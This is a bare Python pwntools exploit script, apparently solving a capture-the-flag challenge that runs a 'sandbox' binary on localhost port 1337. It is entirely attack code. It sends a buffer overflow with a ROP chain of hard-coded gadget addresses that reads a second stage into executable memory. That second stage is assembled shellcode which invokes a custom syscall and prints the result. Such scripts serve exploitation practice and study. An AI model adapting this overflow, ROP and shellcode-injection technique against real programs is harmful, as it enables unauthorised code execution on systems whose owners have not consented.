from pwn import *

context.arch = "amd64"

pop_rdi = 0x401004
pop_rsi = 0x401006
pop_rdx = 0x401008
pop_rax = 0x40100a
syscall = 0x00401016
exe = 0x00401087

# r = process(["./sandbox", "./user"])
r = remote("localhost",1337)
payload = b"\x90" * 0x28
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(exe)
payload += p64(pop_rdx)
payload += p64(100)
payload += p64(syscall)
payload += p64(exe)
r.sendline(payload)

import time
time.sleep(0.5)
payload = asm("""
    mov rdi, 0x1337
    mov rdx, 1
    mov rsi, 0x401020
    mov rax, 1337
    syscall
    mov rdi, 1
    mov rsi, 0x401020
    mov rdx, 0x40
    mov rax, 1
    syscall
""")
r.sendline(payload)

r.interactive()